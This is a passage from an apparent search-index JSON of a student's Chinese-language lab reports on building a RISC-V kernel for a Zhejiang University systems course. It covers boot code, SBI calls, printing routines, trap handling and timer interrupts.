\u5904\u7684\u65ad\u70b9\u3001\u7ee7\u7eed\u8fd0\u884c\uff1a </p> <p>\u5355\u6b65\u8fd0\u884c\u3001\u9000\u51fa\uff1a </p>"},{"location":"cs/system/cs2/lab3/#makefile","title":"Makefile \u76f8\u5173","text":"<ol> <li>\u89c2\u5bdf\u53ef\u7528\u7684 target\uff0c\u5e94\u8be5\u4f7f\u7528 make ? \u6765\u6e05\u9664 Linux \u7684\u6784\u5efa\u4ea7\u7269\uff1f</li> </ol> <p>\u5e94\u8be5\u4f7f\u7528 make clean \u6765\u6e05\u9664\u6784\u5efa\u4ea7\u7269</p> <ol> <li>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5185\u6838\u7f16\u8bd1\u663e\u793a\u7684\u662f\u7b80\u7565\u4fe1\u606f\uff08\u4f8b\u5982\uff1aCC init/main.o\uff09\uff0c\u5e94\u8be5\u4f7f\u7528 make ? \u6765\u663e\u793a Linux \u8be6\u7ec6\u7684\u7f16\u8bd1\u8fc7\u7a0b\u5462\uff1f</li> </ol> <p>make help \u53ef\u4ee5\u770b\u5230\uff1a <pre><code>  make V=0|1 [targets] 0 =&gt; quiet build (default), 1 =&gt; verbose build\n  make V=2   [targets] 2 =&gt; give reason for rebuild of target\n</code></pre> \u6240\u4ee5\u5e94\u8be5\u4f7f\u7528 make V=1</p>"},{"location":"cs/system/cs2/lab4/","title":"RV64 \u5185\u6838\u5f15\u5bfc","text":"<p> \u7ea6 1193 \u4e2a\u5b57  112 \u884c\u4ee3\u7801  6 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab4 \u5b9e\u9a8c\u62a5\u544a\uff082022.11.03 ~ 2022.11.17\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs2/lab4/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u7f16\u5199\u3001\u5b8c\u6210\u6240\u7ed9\u5b9e\u9a8c\u4ee3\u7801\u6846\u67b6\uff0c\u5e76\u6210\u529f\u8fd0\u884c<ul> <li>arch/riscv/kernel/head.S</li> <li>lib/Makefile</li> <li>arch/riscv/kernel/sbi.c</li> <li>lib/print.c</li> <li>arch/riscv/include/defs.h</li> </ul> </li> <li>\u601d\u8003\u9898<ol> <li>\u7f16\u8bd1\u4e4b\u540e\uff0c\u901a\u8fc7 System.map \u67e5\u770b vmlinux.lds \u4e2d\u81ea\u5b9a\u4e49\u7b26\u53f7\u7684\u503c\uff0c\u6bd4\u8f83\u4ed6\u4eec\u7684\u5730\u5740\u662f\u5426\u7b26\u5408\u4f60\u7684\u9884\u671f</li> <li>\u5728\u4f60\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u5904\u6dfb\u52a0\u65ad\u70b9\uff0c\u89c2\u5bdf\u4f60\u7684\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u65f6\u7684\u7279\u6743\u6001\u662f\u591a\u5c11\uff0c\u4e2d\u65ad\u7684\u5f00\u542f\u60c5\u51b5\u662f\u600e\u4e48\u6837\u7684</li> <li>\u5728\u4f60\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u5904\u6dfb\u52a0\u65ad\u70b9\uff0c\u89c2\u5bdf\u5185\u5b58\u4e2d text\u3001data\u3001bss \u6bb5\u7684\u5185\u5bb9\u662f\u600e\u6837\u7684</li> <li>\u5c1d\u8bd5\u4ece\u6c47\u7f16\u4ee3\u7801\u4e2d\u7ed9 C \u51fd\u6570 start_kernel \u4f20\u9012\u53c2\u6570</li> </ol> </li> </ul>"},{"location":"cs/system/cs2/lab4/#_2","title":"\u4ee3\u7801\u7f16\u5199","text":""},{"location":"cs/system/cs2/lab4/#heads-vmlinuxlds","title":"head.S &amp; vmlinux.lds","text":"<p>head.S \u7684\u4f5c\u7528\u662f\u4f5c\u4e3a\u6574\u4e2a\u5185\u6838\u542f\u52a8\u7684\u5f15\u5bfc\u3002\u5176\u8981\u5b8c\u6210\u7684\u662f 1. \u4e3a start_kernel \u8bbe\u7f6e\u4e00\u4e2a\u6808\u7a7a\u95f4\uff08\u5373\u521b\u5efa\u6808\u7a7a\u95f4\u5e76\u5c06 sp \u6307\u5230\u6808\u9876\uff092. \u8df3\u8f6c\u5230 start_kernel \u5185\u3002</p> <p>vmlinux.lds \u7684\u4f5c\u7528\u662f\u5b9a\u4e49\u5185\u6838\u7684\u5185\u5b58\u5e03\u5c40\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u5c06\u6808\u7a7a\u95f4\u653e\u5230 _end \u540e\u9762\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728 vmlinux.lds \u4e2d _end \u540e\u9762\u518d\u52a0\u4e00\u4e2a\u6bb5 .stack\uff0c\u65b9\u4fbf\u540e\u7eed head.S \u5728\u6b64\u5904\u63d2\u5165\u6808\u7a7a\u95f4\uff1a <pre><code>    _end = .;\n\n    .stack : ALIGN(0x1000){\n        _sstack = .;\n\n        *(.stack.entry)\n\n        _estack = .;\n    }\n}\n</code></pre> \u7136\u540e\u5728 head.S \u4e2d\u5229\u7528 .space \u8bbe\u7f6e\u7a7a\u95f4\u5927\u5c0f\u4e3a 4KB\u3001la \u6765\u8bbe\u7f6e sp \u5bc4\u5b58\u5668\u3001j \u6307\u4ee4\u8df3\u8f6c\u5230 start_kernel \u4e2d\uff1a <pre><code>.extern start_kernel\n\n.section .text.entry\n.globl _start\n_start:\n    la sp, boot_stack_top\n    j start_kernel\n\n.section .stack.entry\n.globl boot_stack_bottom\nboot_stack_bottom:\n    .space 4096\n.globl boot_stack_top\nboot_stack_top:\n</code></pre></p>"},{"location":"cs/system/cs2/lab4/#sbic","title":"sbi.c","text":"<p>sbi.c \u7684\u4f5c\u7528\u662f\u5b9e\u73b0 SBI \u8c03\u7528\u3002\u6700\u4e3b\u8981\u7684\u76ee\u7684\u662f\u5b9e\u73b0 sbi_ecall \u6765\u6267\u884c\u73af\u5883\u8c03\u7528\uff0c\u7528\u5176\u53ef\u4ee5\u5b9e\u73b0 sbi_console_putchar \u7b49\u51fd\u6570\u3002</p> <p>sbi_ecall \u7684\u5b9e\u73b0\u53c2\u8003\u4e86 Linux 6.0.7 \u7684\u4ee3\u7801\u5b9e\u73b0\u3002\u5176\u4e3b\u8981\u8fc7\u7a0b\u5c31\u662f\u5c06\u51fd\u6570\u53c2\u6570\u5e03\u5c40\u5230\u5bc4\u5b58\u5668\u4e2d\uff08ext \u653e\u5230 a7\u3001fid \u653e\u5230 a6\u3001arg0-5 \u653e\u5230 a0-5\uff09\uff0c\u7136\u540e\u6267\u884c ecall \u6307\u4ee4\uff0c\u6700\u540e\u8fd4\u56de\u7684\u7ed3\u679c\u6709 a0 \u8868\u793a error code\uff0ca1 \u8868\u793a\u8fd4\u56de\u503c\uff08\u6240\u4ee5\u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u8981\u662f\u8bfb\u5199\u7684\uff0c\u5176\u5b83\u662f\u53ef\u8bfb\u5373\u53ef\uff09\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u4fee\u6539\u5185\u5b58\u3002\u5229\u7528\u5185\u8054\u6c47\u7f16\u53ef\u4ee5\u8fdb\u884c\u5982\u4e0b\u5b9e\u73b0\uff1a <pre><code>struct sbiret sbi_ecall(int ext, int fid, uint64 arg0,\n                        uint64 arg1, uint64 arg2,\n                        uint64 arg3, uint64 arg4,\n                        uint64 arg5)\n{\n    struct sbiret ret;\n    register uint64 a0 asm(\"a0\") = (uint64)(arg0);\n    register uint64 a1 asm(\"a1\") = (uint64)(arg1);\n    register uint64 a2 asm(\"a2\") = (uint64)(arg2);\n    register uint64 a3 asm(\"a3\") = (uint64)(arg3);\n    register uint64 a4 asm(\"a4\") = (uint64)(arg4);\n    register uint64 a5 asm(\"a5\") = (uint64)(arg5);\n    register uint64 a6 asm(\"a6\") = (uint64)(fid);\n    register uint64 a7 asm(\"a7\") = (uint64)(ext);\n    asm volatile (\n        \"ecall\"\n        : \"+r\" (a0), \"+r\" (a1)\n        : \"r\" (a2), \"r\" (a3), \"r\" (a4), \"r\" (a5), \"r\" (a6), \"r\" (a7)\n        : \"memory\"\n    );\n    ret.error = a0;\n    ret.value = a1;\n    return ret;\n}\n</code></pre></p> <p>\u5bf9\u4e8e\u5b83\u7684\u4f7f\u7528\u53ef\u4ee5\u5148\u5b9e\u73b0\u4e09\u4e2a\uff08sbi.h \u4e2d\u8fd8\u9700\u8981\u6dfb\u52a0\u4e00\u4e0b\u51fd\u6570\u58f0\u660e\uff09\uff1a - sbi_set_timer\uff1aext \u4e3a 0x00\uff0c\u6709\u4e00\u4e2a\u8f93\u5165 stime_value - sbi_console_putchar\uff1aext \u4e3a 0x01\uff0c\u6709\u4e00\u4e2a\u8f93\u5165 ch \u8868\u793a\u8981\u8f93\u51fa\u7684\u5b57\u7b26 ASCII \u7801 - sbi_console_getchar\uff1aext \u4e3a 0x02\uff0c\u65e0\u8f93\u5165\uff0ca0\uff08\u5373 ret.error\uff09\u4e3a\u8f93\u5165\u5b57\u7b26\u7684 ASCII \u7801</p> <pre><code>void sbi_set_timer(uint64 stime_value) {\n    sbi_ecall(0x00, 0, stime_value, 0, 0, 0, 0, 0);\n}\n\nvoid sbi_console_putchar(int ch) {\n    sbi_ecall(0x01, 0, ch, 0, 0, 0, 0, 0);\n}\n\nint sbi_console_getchar() {\n    struct sbiret ret;\n    ret = sbi_ecall(0x02, 0, 0, 0, 0, 0, 0, 0);\n    return ret.error;\n}\n</code></pre>"},{"location":"cs/system/cs2/lab4/#printc-makefile","title":"print.c &amp; Makefile","text":"<p>print.c \u4e2d\u9700\u8981\u5b9a\u4e49\u4e24\u4e2a\u4f7f\u7528 sbi_ecall (sbi_console_putchar) \u6765\u5b9e\u73b0\u8f93\u51fa\u7684\u4e24\u4e2a\u51fd\u6570 puts \u548c puti\u3002\u5176\u4e2d puts \u76f4\u63a5\u9010\u5b57\u7b26\u8c03\u7528 sbi_console_putchar \u8f93\u51fa\u76f4\u5230\u9047\u5230 '\\0'\uff1a <pre><code>void puts(char *s) {\n    while (*s) {\n        sbi_console_putchar(*s++);\n    }\n}\n</code></pre> puti \u5148\u679a\u4e3e 0\u3001\u8d1f\u6570\u7b49\u7279\u6b8a\u60c5\u51b5\uff0c\u7136\u540e\u5229\u7528\u53d6\u6a21\u8fd0\u7b97\u6765\u5c06\u6570\u5b57\u9010\u4f4d\u8f6c\u4e3a\u5b57\u7b26\uff0c\u518d\u9010\u5b57\u7b26\u8f93\u51fa\uff1a <pre><code>void puti(int x) {\n    char buf[16];\n    int i = 0;\n    if (x == 0) {\n        sbi_console_putchar('0');\n        return;\n    }\n    if (x &lt; 0) {\n        sbi_console_putchar('-');\n        x = -x;\n    }\n    while (x) {\n        buf[i++] = '0' + x % 10;\n        x /= 10;\n    }\n    while (i) {\n        sbi_console_putchar(buf[--i]);\n    }\n}\n</code></pre></p> <p>Makefile \u548c\u5176\u5b83 Makefile \u4e00\u6837\u5c31\u53ef\u4ee5\uff0c\u5373\u5c06\u76ee\u5f55\u4e0b\u6240\u6709 .c \u6587\u4ef6\u7f16\u8bd1\u51fa .o \u6587\u4ef6\uff1a <pre><code>C_SRC       = $(sort $(wildcard *.c))\nOBJ         = $(patsubst %.c,%.o,$(C_SRC))\n\nfile = main.o\nall:$(OBJ)\n\n%.o:%.c\n    ${GCC} ${CFLAG} -c $&lt;\nclean:\n    $(shell rm *.o 2&gt;/dev/null)\n</code></pre></p>"},{"location":"cs/system/cs2/lab4/#defsh","title":"defs.h","text":"<p>defs.h \u4e2d\u9700\u8981\u8865\u5168 csr_read \u5b8f\u3002\u76f4\u63a5\u4f7f\u7528\u5185\u8054\u6c47\u7f16\u8c03\u7528 csrr \u6307\u4ee4\u5c06 csr \u5bc4\u5b58\u5668\u7684\u503c\u8bfb\u5165 __v \u53d8\u91cf\u5373\u53ef\uff1a <pre><code>#define csr_read(csr)                       \\\n({                                          \\\n    register uint64 __v;                    \\\n    asm volatile (\"csrr %0, \" #csr          \\\n                    : \"=r\" (__v) :          \\\n                    : \"memory\");            \\\n    __v;                                    \\\n})\n</code></pre></p>"},{"location":"cs/system/cs2/lab4/#_3","title":"\u8fd0\u884c\u7ed3\u679c","text":"<p>\u8fd0\u884c make \u53ef\u4ee5\u6b63\u5e38\u7f16\u8bd1\u5e76\u4ea7\u751f\u7f16\u8bd1\u4ea7\u7269\uff1a </p> <p>\u8fd0\u884c make run \u53ef\u4ee5\u6b63\u5e38\u542f\u52a8\u5185\u6838\u5e76\u8f93\u51fa\u4fe1\u606f \u201c2022 ZJU Computer System II\u201d\uff1a</p>"},{"location":"cs/system/cs2/lab4/#_4","title":"\u601d\u8003\u9898","text":""},{"location":"cs/system/cs2/lab4/#systemmap","title":"\u89c2\u5bdf System.map \u4e2d\u7684\u5730\u5740\u662f\u5426\u7b26\u5408\u9884\u671f","text":"<p>\u67e5\u770b System.map \u5e76\u5c06\u5176\u6709\u6548\u90e8\u5206\u6309\u7167\u5730\u5740\u6392\u5e8f\u8f93\u51fa\uff1a</p> <p>\u7ecf\u89c2\u5bdf\u3001_start \u7684\u5730\u5740\u4e3a 0x80200000\u3001\u540c\u6837 _stext \u5373 .text \u6bb5\u7684\u8d77\u59cb\u5730\u5740\u4e5f\u4e3a 0x80200000\u3002\u63a5\u7740\u662f\u4e00\u4e9b sbi.c \u4e2d\u5b9e\u73b0\u7684\u51fd\u6570\uff0c\u7136\u540e\u662f start_kernel \u51fd\u6570\u4e0e\u5176\u540e\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u7136\u540e .text \u6bb5\u7ed3\u675f\uff08_etext\uff09\u3002\u540e\u9762\u662f .rodata \u6bb5\uff0c\u5176\u4fdd\u5b58\u4e86\u5b57\u7b26\u4e32 \" ZJU Computer System II\"\u3002\u7136\u540e\u662f\u7a7a\u7684 .data \u6bb5\u548c .bss \u6bb5\uff08\u8fd9\u91cc\u6ca1\u6709\u7528\u5230\uff09\uff0c\u63a5\u7740 _end \u5373\u5185\u6838\u7ed3\u675f\u5730\u5740\u3002\u7136\u540e\u662f\u6808\u7a7a\u95f4\uff08\u8d77\u59cb sp \u4f4d\u4e8e boot_stack_top\uff0c\u6808\u7a7a\u95f4\u5411\u5c0f\u5730\u5740\u589e\u957f\uff09\u3002\u53ef\u89c1\u5747\u7b26\u5408\u9884\u671f\u3002</p>"},{"location":"cs/system/cs2/lab4/#_5","title":"\u8c03\u8bd5\u89c2\u5bdf\u7a0b\u5e8f\u5f00\u59cb\u65f6\u7684\u7279\u6743\u6001\u548c\u4e2d\u65ad\u4fe1\u606f","text":"<p>gdb \u5728\u5f00\u5934\u4e0b\u65ad\u70b9\u3001\u8fd0\u884c\u5230\u7a0b\u5e8f\u5f00\u5934\u5904\uff0c\u68c0\u67e5\u7279\u6743\u6001\uff08priv \u5bc4\u5b58\u5668\uff0c\u503c\u4e3a 1 \u5373 Supervisor\uff09\u548c\u5b58\u6709\u4e2d\u65ad\u4fe1\u606f\u7684\u5bc4\u5b58\u5668\uff1a </p>"},{"location":"cs/system/cs2/lab4/#_6","title":"\u8c03\u8bd5\u89c2\u5bdf\u7a0b\u5e8f\u5f00\u59cb\u65f6\u5404\u6bb5\u5185\u5bb9","text":"<p>\u8fde\u63a5 gdb\u3001\u4e0b\u65ad\u70b9\u3001\u5f00\u59cb\u8fd0\u884c\u3001\u68c0\u67e5\u5404\u6bb5\u5185\u5bb9\uff1a </p> <p>\u53ef\u4ee5\u770b\u89c1 .text \u6bb5\u5b58\u4e86\u6307\u4ee4\u3002.rodata \u6bb5\u5b58\u4e86\u5b57\u7b26\u4e32 \" ZJU Computer System II\\n\"\u3002.data \u6bb5\u770b\u8d77\u6765\u4e0d\u4e3a\u7a7a\uff0c\u4f46\u5b9e\u9645\u4e0a .data \u6bb5\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\u5e76\u4e0d\u5b58\u5728\uff0c\u8fd9\u90e8\u5206\u6570\u636e\u4e3a _GLOBAL_OFFSET_TABLE_ \u5185\u5bb9\u3002.bss \u6bb5\u4e3a\u7a7a\uff08\u5b9e\u9645\u4e5f\u4e0d\u5b58\u5728\uff09\u3001\u6808\u7a7a\u95f4\u5185\u5bb9\u4e3a\u7a7a\u3002</p>"},{"location":"cs/system/cs2/lab4/#c-start_kernel","title":"\u5c1d\u8bd5\u4ece\u6c47\u7f16\u4ee3\u7801\u4e2d\u7ed9 C \u51fd\u6570 start_kernel \u4f20\u9012\u53c2\u6570","text":"<p>RISC-V \u8c03\u7528\u51fd\u6570\u4f1a\u4f7f\u7528 a0-a7 \u5bc4\u5b58\u5668\u4f20\u9012\u53c2\u6570\uff0c\u6240\u4ee5\u5728 head.S \u4e2d\u8bbe\u7f6e\u5bc4\u5b58\u5668\u7684\u503c\u5c31\u53ef\u4ee5\u5b8c\u6210\u603c start_kernel \u51fd\u6570\u7684\u4f20\u53c2\u3002\u9996\u5148\u4fee\u6539 init/main.c \u6765\u4e3a start_kernel \u6dfb\u52a0\u53c2\u6570\uff1a <pre><code>int start_kernel(int x) {\n    puti(x);\n    puts(\" ZJU Computer System II\\n\");\n    ...\n}\n</code></pre> \u7136\u540e\u5728 head.S \u4e2d\u76f4\u63a5\u4e3a a0 \u5bc4\u5b58\u5668\u8d4b\u503c\u5b8c\u6210\u4f20\u53c2\uff1a <pre><code>_start:\n    la sp, boot_stack_top\n    li a0, 2022\n    j start_kernel\n</code></pre> \u8fd0\u884c make run \u53ef\u4ee5\u6b63\u5e38\u542f\u52a8\u5185\u6838\u5e76\u8f93\u51fa\u4fe1\u606f \u201c2022 ZJU Computer System II\u201d\uff1a</p>"},{"location":"cs/system/cs2/lab5/","title":"RV64 \u65f6\u949f\u4e2d\u65ad\u5904\u7406","text":"<p> \u7ea6 1000 \u4e2a\u5b57  63 \u884c\u4ee3\u7801  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab5 \u5b9e\u9a8c\u62a5\u544a\uff082022.11.17 ~ 2022.12.01\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs2/lab5/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u5b8c\u6210\u5bf9\u5f02\u5e38\u5904\u7406\u7684\u521d\u59cb\u5316\u3001\u5b9e\u73b0\u4e0a\u4e0b\u6587\u5207\u6362\u529f\u80fd\u3001\u7f16\u5199\u5f02\u5e38\u5904\u7406\u51fd\u6570\u3001\u5b8c\u6210\u5bf9\u65f6\u95f4\u4e2d\u65ad\u4e8b\u4ef6\u7684\u5904\u7406</li> <li>\u5b8c\u6210\u4ee3\u7801\u5e76\u7f16\u8bd1\u8fd0\u884c\uff1a<ol> <li>arch/riscv/kernel/head.S</li> <li>arch/riscv/kernel/entry.S</li> <li>arch/riscv/kernel/trap.c</li> <li>arch/riscv/kernel/clock.c </li> <li>\u5176\u5b83\u5fc5\u8981\u7684\u4fee\u6539</li> </ol> </li> <li>\u601d\u8003\u9898<ol> <li>\u89e3\u91ca OpenSBI \u8f93\u51fa\u7684 MIDELEG\u3001MEDELEG \u7684\u542b\u4e49</li> <li>\u673a\u5668\u542f\u52a8\u540e time\u3001cycle \u5bc4\u5b58\u5668\u5206\u522b\u662f\u4ece 0 \u5f00\u59cb\u8ba1\u65f6\u7684\u5417\uff0c\u4ece 0 \u8ba1\u65f6\u662f\u5426\u662f\u5fc5\u8981\u7684\u5462\uff1f</li> <li>\u8c08\u8c08\u5982\u4f55\u5728\u4e00\u53f0\u4e0d\u652f\u6301\u4e58\u9664\u6cd5\u6307\u4ee4\u6269\u5c55\u7684\u5904\u7406\u5668\u4e0a\u6267\u884c\u4e58\u9664\u6cd5\u6307\u4ee4</li> </ol> </li> </ul>"},{"location":"cs/system/cs2/lab5/#_2","title":"\u4ee3\u7801\u7f16\u5199","text":""},{"location":"cs/system/cs2/lab5/#lab5","title":"lab5 \u63d0\u4f9b\u4fee\u6539","text":"<p>\u6309\u7167\u5b9e\u9a8c\u624b\u518c\u548c repo \u4e2d\u63d0\u4f9b\u7684\u4ee3\u7801\u8fdb\u884c\u4fee\u6539\u3002\u5373\u5c06 puti\u3001puts \u6362\u4e3a printk\uff0c\u9700\u8981\u989d\u5916\u4fee\u6539 init/main.c\uff1a <pre><code>#include \"printk.h\"\n\nextern void test();\n\nint start_kernel(int x) {\n    printk(\"%d\", x);\n    printk(\" ZJU Computer System II\\n\");\n    test(); // DO NOT DELETE !!!\n    return 0;\n}\n</code></pre></p> <p>\u4ee5\u53ca\u6839\u636e\u6307\u5bfc\u4fee\u6539 init/test.c\u3001vmlinux.lds\u3001head.S\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002</p>"},{"location":"cs/system/cs2/lab5/#heads","title":"head.S \u5f00\u542f\u5f02\u5e38\u5904\u7406","text":"<p>\u6839\u636e\u5b9e\u9a8c\u6307\u5bfc\u4e2d\u7684\u6b65\u9aa4\u8fdb\u884c\u7f16\u5199\uff1a</p> <ol> <li>\u8bbe\u7f6e stvec \u4e3a _traps \u5730\u5740\uff0c\u4e14\u4f7f\u7528 direct \u6a21\u5f0f\uff1a     <pre><code>la a0, _traps\ncsrw stvec, a0\n</code></pre><ul> <li>\u56e0\u4e3a\u5bf9\u9f50\u7684\u539f\u56e0\uff0c\u540e\u4e24\u4f4d\u4e00\u5b9a\u4e3a 0\uff0c\u5373 direct \u6a21\u5f0f\uff0c\u4e0d\u9700\u8981\u5904\u7406</li> </ul> </li> <li>\u5c06 sie[STIE] \u7f6e 1<ul> <li>sie \u7684\u53f3\u6570\u7b2c 5 \u4f4d\u4e3a STIE\uff0c\u6240\u4ee5\u901a\u8fc7 csrs \u5c06\u5176\u8bbe\u7f6e\u4e3a 1 \u5373\u53ef\uff1a <pre><code>li a0, 1 &lt;&lt; 5\ncsrs sie, a0\n</code></pre></li> </ul> </li> <li>\u8bbe\u7f6e\u7b2c\u4e00\u6b21\u65f6\u949f\u4e2d\u65ad<ul> <li>\u6309\u7167\u8981\u6c42\uff0c\u6839\u636e clock_set_next_event \u7684\u903b\u8f91\u7528\u6c47\u7f16\u5b9e\u73b0</li> <li>\uff08\u5728\u6b64\u524d\u4e00\u5b9a\u8981\u5148\u8bbe\u7f6e\u597d sp\uff0c\u56e0\u4e3a\u6709 call \u4e86\uff09 <pre><code>rdtime a0\nli t0, 10000000\nadd a0, a0, t0\ncall sbi_set_timer\n</code></pre></li> </ul> </li> <li>\u5f00\u542f S \u6001\u4e0b\u4e2d\u65ad\u54cd\u5e94\uff0c\u5c06 sstatus[SIE] \u7f6e 1<ul> <li>sstatus \u7684\u53f3 1 \u4f4d\u4e3a SIE\uff0c\u901a\u8fc7 csrs \u8bbe\u7f6e <pre><code>csrs sstatus, 1 &lt;&lt; 1\n</code></pre></li> </ul> </li> </ol>"},{"location":"cs/system/cs2/lab5/#entrys-trap","title":"entry.S \u4e2d\u5b9e\u73b0\u9488\u5bf9 trap \u7684\u4e0a\u4e0b\u6587\u5207\u6362","text":"<p>\u6839\u636e\u5b9e\u9a8c\u6307\u5bfc\uff1a</p> <ol> <li>\u4fdd\u5b58 CPU \u5bc4\u5b58\u5668\u5230\u6808\u4e0a<ul> <li>\u540e\u9762 sp \u9700\u8981\u6700\u540e\u6062\u590d\uff0c\u6240\u4ee5\u9700\u8981\u6700\u5148\u538b\u5165 sp\uff0c\u5176\u5b83\u4efb\u610f <pre><code>sd sp, -8(sp)\nsd ra, -16(sp)\nsd gp, -24(sp)  \n...\nsd t5, -240(sp)  \nsd t6, -248(sp)\naddi sp, sp, -248\n</code></pre></li> </ul> </li> <li>\u8c03\u7528 trap_handler<ul> <li>\u9700\u8981\u4f20\u5165\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570 scause \u653e\u5165 a0\u3001\u7b2c\u4e8c\u4e2a\u53c2\u6570 sepc \u653e\u5165 a1 <pre><code>csrr a0, scause\ncsrr a1, sepc\ncall trap_handler\n</code></pre></li> </ul> </li> <li>\u4ece\u6808\u4e0a\u6062\u590d\u5bc4\u5b58\u5668<ul> <li>\u548c\u7b2c\u4e00\u6b65\u7684\u987a\u5e8f\u76f8\u53cd <pre><code>ld t6, 0(sp)  \nld t5, 8(sp)  \n...\nld gp, 224(sp)  \nld ra, 232(sp)  \nld sp, 240(sp)\n</code></pre></li> </ul> </li> <li>\u4ece trap \u4e2d\u8fd4\u56de<ul> <li>\u7531\u4e8e\u662f\u4ece S \u6001\u5f02\u5e38\u8fd4\u56de\uff0c\u6240\u4ee5\u8981\u4f7f\u7528 sret <pre><code>sret\n</code></pre></li> </ul> </li> </ol>"},{"location":"cs/system/cs2/lab5/#trapc","title":"trap.c \u5b9e\u73b0\u5f02\u5e38\u5904\u7406\u51fd\u6570","text":"<p>\u9700\u8981\u901a\u8fc7 scause \u5224\u65ad trap \u7c7b\u578b\uff0c\u5982\u679c\u662f\u65f6\u949f\u4e2d\u65ad\uff0c\u5219\u6253\u5370\u4fe1\u606f\u5e76\u8c03\u7528 clock_set_next_event() \u51fd\u6570\u3002</p> <p>\u6839\u636e\u624b\u518c\uff0c\u65f6\u949f\u4e2d\u65ad\u65f6 scause \u7684\u6700\u9ad8\u4f4d\u4e3a 1\uff08Interrupt\uff09\uff0c\u5269\u4f59\u4f4d\u8868\u793a\u7684\u503c\uff08Exception Code\uff09\u4e3a 5\uff08Supervisor timer interrupt\uff09\uff0c\u6240\u4ee5\u5728\u51fd\u6570\u91cc\u8fd9\u6837\u5224\u65ad\u5373\u53ef\uff1a <pre><code>#include \"clock.h\"\n#include \"printk.h\"\n\nvoid trap_handler(unsigned long scause, unsigned long sepc) {\n    if ((scause &gt;&gt; 63) &amp;&amp; (scause &amp; 0x7FFFFFFFFFFFFFFF) == 5) {\n        printk(\"[S] Supervisor Mode Timer Interrupt\\n\");\n        clock_set_next_event();\n        return;\n    }\n}\n</code></pre></p> <p>\u4ee5\u53ca\u4e3a\u4e86\u4f7f\u7528 clock.c \u4e2d\u7684 clock_set_next_event \u51fd\u6570\uff0c\u8fd8\u9700\u8981\u7f16\u5199\u4e00\u4e2a clock.h \u5934\u6587\u4ef6\uff1a <pre><code>#ifndef _CLOCK_H\n#define _CLOCK_H\nvoid clock_set_next_event();\n#endif\n</code></pre></p>"},{"location":"cs/system/cs2/lab5/#clockc","title":"clock.c \u5b9e\u73b0\u4e2d\u65ad\u76f8\u5173\u51fd\u6570","text":"<p>get_cycles \u51fd\u6570\u901a\u8fc7\u5185\u8054\u6c47\u7f16\u8c03\u7528 rdtime \u5373\u53ef\uff1a <pre><code>unsigned long get_cycles() {\n    unsigned long time;\n    asm volatile (\n        \"rdtime %[time]\"\n        : [time] \"=r\" (time)\n        : : \"memory\"\n    );\n    return time;\n}\n</code></pre></p> <p>clock_set_next_event \u51fd\u6570\u91cc\u8ba1\u7b97\u51fa next_time \u76f4\u63a5\u8c03\u7528 sbi_set_timer \u5373\u53ef\uff1a <pre><code>void clock_set_next_event() {\n    unsigned long next_time = get_cycles() + TIMECLOCK;\n    sbi_set_timer(next_time);\n}\n</code></pre></p>"},{"location":"cs/system/cs2/lab5/#_3","title":"\u8fd0\u884c\u7ed3\u679c","text":"<p>make run \u7ed3\u679c\u8f93\u51fa\u6b63\u786e\uff1a</p>"},{"location":"cs/system/cs2/lab5/#_4","title":"\u601d\u8003\u9898","text":""},{"location":"cs/system/cs2/lab5/#opensbi-midelegmedeleg","title":"\u89e3\u91ca OpenSBI \u8f93\u51fa MIDELEG\u3001MEDELEG \u542b\u4e49","text":"<p>MIDELEG\uff08machind interrupt delegation register\uff09\u3001MEDELEG\uff08machine exception delegation register\uff09\u5e76\u79f0 machine trap delegation registers\u3002\u5b83\u4eec\u8868\u793a\u662f\u5426\u5c06\u5bf9\u5e94\u4f4d\u4e0a\u7684 trap \u4ea4\u7ed9 S \u6a21\u5f0f\u6765\u5904\u7406\uff0c\u5982\u679c\u5bf9\u5e94\u4f4d\u4e3a 1 \u5219\u4ee3\u7406\u7ed9 S\u3001\u5426\u5219\u7531\u673a\u5668\u6a21\u5f0f\u5904\u7406\u3002\u6bcf\u4e2a trap \u5bf9\u5e94\u7684\u4f4d\u548c scause \u4e2d\u5b9a\u4e49\u76f8\u540c\u3002</p> <p>MIDELEG \u8f93\u51fa\u503c\u4e3a 0x222\uff080b1000100010\uff09\uff0c\u7b2c 5 \u4f4d\u4e3a 1\uff0c\u5bf9\u5e94\u4e2d\u65ad Supervisor timer interrupt\u3002\u5982\u679c\u5176\u4e3a 0\uff0c\u5219\u4e0d\u4f1a\u8fdb\u5165\u6211\u4eec\u7f16\u5199\u7684\u5904\u7406\u7a0b\u5e8f\uff0c\u4e5f\u5c31\u4e0d\u4f1a\u8f93\u51fa\u5bf9\u5e94\u6d88\u606f\u3002</p>"},{"location":"cs/system/cs2/lab5/#timecycle-0","title":"\u673a\u5668\u542f\u52a8\u540e time\u3001cycle \u5bc4\u5b58\u5668\u5206\u522b\u662f\u4ece 0 \u5f00\u59cb\u8ba1\u65f6\u7684\u5417\uff1f","text":"<p>make debug \u542f\u52a8\uff0cgdb \u8fde\u63a5\u540e\u76f4\u63a5\u8f93\u51fa time 